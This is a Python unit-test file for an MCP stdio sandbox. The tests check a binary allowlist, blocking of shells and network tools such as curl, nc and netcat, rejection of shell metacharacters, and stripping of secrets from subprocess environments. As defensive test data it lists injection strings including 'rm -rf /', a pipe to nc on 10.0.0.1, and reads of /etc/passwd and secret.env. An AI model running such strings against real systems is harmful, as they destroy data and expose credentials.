"""Unit tests for PRIVGUARD MCP stdio Process Isolation and Sandboxing."""

import os
import pytest
from app.core.exceptions import MCPStdioSandboxError
from app.mcp.stdio_sandbox import mcp_stdio_sandbox


def test_stdio_approved_binaries_accepted():
    """Verifies that approved executables in allowlist pass validation."""
    approved = ["node", "npx", "python", "python3", "uvx", "python.exe", "node.exe"]
    for bin_cmd in approved:
        cmd, clean_args = mcp_stdio_sandbox.validate_command(bin_cmd, ["--version"])
        assert cmd == bin_cmd
        assert clean_args == ["--version"]


def test_stdio_unapproved_binaries_blocked():
    """Verifies that non-allowlisted binaries are rejected with MCPStdioSandboxError."""
    blocked = [
        "bash",
        "sh",
        "zsh",
        "cmd",
        "powershell",
        "pwsh",
        "curl",
        "wget",
        "nc",
        "netcat",
        "sudo",
        "/bin/bash",
        "C:\\Windows\\System32\\cmd.exe",
    ]
    for bin_cmd in blocked:
        with pytest.raises(MCPStdioSandboxError) as exc_info:
            mcp_stdio_sandbox.validate_command(bin_cmd, ["arg1"])
        assert "not in approved stdio allowlist" in str(exc_info.value).lower()


def test_stdio_metacharacters_in_args_blocked():
    """Verifies that shell metacharacters and chaining patterns in arguments are rejected."""
    dangerous_args = [
        ["arg1; rm -rf /"],
        ["arg1 | nc 10.0.0.1 8080"],
        ["arg1 && whoami"],
        ["`cat /etc/passwd`"],
        ["$(cat secret.env)"],
        ["arg > output.txt"],
        ["arg < input.txt"],
        ["arg\nmalicious"],
        ["rm -rf ."],
    ]
    for args in dangerous_args:
        with pytest.raises(MCPStdioSandboxError) as exc_info:
            mcp_stdio_sandbox.validate_command("python", args)
        assert "metacharacter" in str(exc_info.value).lower() or "forbidden" in str(exc_info.value).lower()


def test_stdio_environment_sanitization_strips_secrets():
    """Verifies that sensitive credentials, master keys, and tokens are never leaked to subprocess env."""
    # Set simulated master secrets in OS environ
    os.environ["PRIVGUARD_MASTER_KEY"] = "super-secret-master-key-999"
    os.environ["DATABASE_URL"] = "postgresql://user:pass@localhost:5432/db"
    os.environ["JWT_SECRET_KEY"] = "jwt-signing-key"

    custom_env = {
        "MY_TOOL_DATA_DIR": "/var/data",
        "CUSTOM_SECRET_KEY": "leak_me",
        "API_TOKEN": "token_leak",
        "USER_PASSWORD": "password_leak",
    }

    clean_env = mcp_stdio_sandbox.get_sanitized_environment(custom_env)

    # Assert master keys and secrets are completely stripped
    assert "PRIVGUARD_MASTER_KEY" not in clean_env
    assert "DATABASE_URL" not in clean_env
    assert "JWT_SECRET_KEY" not in clean_env
    assert "CUSTOM_SECRET_KEY" not in clean_env
    assert "API_TOKEN" not in clean_env
    assert "USER_PASSWORD" not in clean_env

    # Assert safe custom vars and safe system paths are kept
    assert clean_env.get("MY_TOOL_DATA_DIR") == "/var/data"
    assert "PATH" in clean_env
